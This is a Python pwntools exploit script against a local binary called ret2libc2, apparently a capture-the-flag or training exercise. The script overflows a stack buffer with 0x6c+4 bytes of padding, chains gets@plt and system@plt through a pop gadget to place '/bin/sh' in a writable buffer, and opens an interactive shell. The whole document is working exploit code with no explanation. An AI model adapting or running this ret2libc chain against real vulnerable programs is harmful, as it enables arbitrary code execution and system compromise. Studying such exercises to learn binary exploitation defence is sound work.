##!/usr/bin/env python
from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x0804a080
offset = 0x6c+4
payload = flat(
    [b'A' * offset, gets_plt, pop_ebx, buf2, system_plt, 0xaaaaaaaa, buf2])
sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()